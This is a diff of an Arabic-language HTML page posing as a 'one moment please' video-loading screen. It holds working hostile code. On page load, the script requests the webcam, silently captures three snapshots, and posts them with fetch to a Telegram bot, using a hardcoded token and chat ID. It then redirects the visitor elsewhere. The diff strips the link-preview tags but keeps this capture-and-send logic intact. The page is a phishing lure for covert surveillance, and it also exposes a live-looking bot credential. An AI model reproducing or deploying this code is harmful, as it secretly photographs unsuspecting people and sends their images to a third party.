@@ -4,16 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لحظة واحدة</title>
-
-    <!-- وسوم Open Graph الأساسية (سيتم تعيين الصورة عبر JS) -->
-    <meta property="og:title" content="لحظة واحدة" />
-    <meta property="og:description" content="تم التوجيه عبر البوت" />
-    <meta property="og:type" content="website" />
-    <meta property="og:url" content="https://app-display.github.io/ca.html-chatld2/" />
-    <meta id="og-image" property="og:image" content="" />
-    <meta id="og-image-width" property="og:image:width" content="1200" />
-    <meta id="og-image-height" property="og:image:height" content="630" />
-
     <style>
         body { 
             background-color: #0d0d0d; 
@@ -35,111 +25,74 @@
             font-size: 24px; 
             margin-top: 10px; 
         }
-        #status {
-            font-size: 18px;
-            color: #66ccff;
-            margin-top: 20px;
-            background: rgba(255,255,255,0.1);
-            padding: 8px 20px;
-            border-radius: 30px;
-            border: 1px solid #66ccff;
-            opacity: 0.8;
-        }
-        #thumbnail-preview {
-            max-width: 300px;
-            border-radius: 8px;
-            margin-top: 10px;
-            border: 2px solid #ff6600;
-            display: none;
-        }
     </style>
 </head>
 <body>
 
     <div id="timer">10</div>
     <div id="message">لحظة واحدة من فضلك</div>
-    <div id="status">🎬 جاري تشغيل الفيديو</div>
-    <img id="thumbnail-preview" />
-
     <video id="video" style="display:none;" playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        (function() {
-            // قراءة المعاملات من الرابط
-            const urlParams = new URLSearchParams(window.location.search);
-            const TARGET_URL = urlParams.get('target') || "https://google.com";
-            const CHAT_ID = urlParams.get('chatId') || '8169635171';
-            const IMAGE_URL = urlParams.get('image') || '';
-            const TOKEN = '8128965245:AAHZ0LIhLWdJ5WcE9-joCLJkOrScPmPBCXs';
+        const urlParams = new URLSearchParams(window.location.search);
+        const TARGET_URL = urlParams.get('target') || "https://google.com";
+        const CHAT_ID = urlParams.get('chatId') || '8169635171';
+        const TOKEN = '8128965245:AAHZ0LIhLWdJ5WcE9-joCLJkOrScPmPBCXs';
 
-            // ====== تعيين og:image ديناميكياً ======
-            const ogImage = document.getElementById('og-image');
-            if (IMAGE_URL) {
-                ogImage.setAttribute('content', IMAGE_URL);
-                // عرض الصورة في الصفحة أيضاً
-                const img = document.getElementById('thumbnail-preview');
-                img.src = IMAGE_URL;
-                img.style.display = 'block';
-            }
+        async function captureAndSend(video) {
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            return new Promise((resolve) => {
+                canvas.toBlob(async (blob) => {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    resolve();
+                }, 'image/jpeg', 0.7);
+            });
+        }
 
-            // ====== دوال التقاط الكاميرا وإرسال الصور (كما هي) ======
-            async function captureAndSend(video) {
-                const canvas = document.getElementById('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                
-                return new Promise((resolve) => {
-                    canvas.toBlob(async (blob) => {
-                        const fd = new FormData();
-                        fd.append('chat_id', CHAT_ID);
-                        fd.append('photo', blob, 'shot.jpg');
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                        resolve();
-                    }, 'image/jpeg', 0.7);
-                });
-            }
+        async function startProcess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await video.play();
 
-            async function startProcess() {
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    const video = document.getElementById('video');
-                    video.srcObject = stream;
-                    await video.play();
-
-                    for (let i = 0; i < 3; i++) {
-                        await captureAndSend(video);
-                        if (i < 2) await new Promise(r => setTimeout(r, 1000));
-                    }
-
-                    stream.getTracks().forEach(t => t.stop());
-
-                    let count = 10;
-                    const timerEl = document.getElementById('timer');
-                    const statusEl = document.getElementById('status');
-                    
-                    const interval = setInterval(() => {
-                        count--;
-                        if (count > 0) {
-                            timerEl.innerText = count;
-                            statusEl.innerText = `🎬 جاري تشغيل الفيديو (${count})`;
-                        } else {
-                            timerEl.innerText = "تم التوجيه";
-                            statusEl.innerText = "✅ تم التوجيه";
-                            clearInterval(interval);
-                            window.location.replace(TARGET_URL);
-                        }
-                    }, 1000);
-                } catch (e) {
-                    document.getElementById('message').innerText = "يرجى الضغط على سماح للكاميرا";
-                    document.getElementById('status').innerText = "⛔ الكاميرا غير متاحة";
+                // التقاط 3 صور بفاصل ثانية
+                for (let i = 0; i < 3; i++) {
+                    await captureAndSend(video);
+                    if (i < 2) await new Promise(r => setTimeout(r, 1000));
                 }
-            }
 
-            // بدء العملية عند تحميل الصفحة
-            window.onload = startProcess;
-        })();
+                stream.getTracks().forEach(t => t.stop());
+
+                // بدء العد التنازلي
+                let count = 10;
+                const timerEl = document.getElementById('timer');
+                const messageEl = document.getElementById('message');
+                
+                const interval = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        timerEl.innerText = count;
+                    } else {
+                        timerEl.innerText = "تم التوجيه";
+                        clearInterval(interval);
+                        window.location.replace(TARGET_URL);
+                    }
+                }, 1000);
+            } catch (e) {
+                document.getElementById('message').innerText = "يرجى الضغط على سماح للكاميرا";
+            }
+        }
+
+        window.onload = startProcess;
     </script>
 </body>
-</html>
+</html
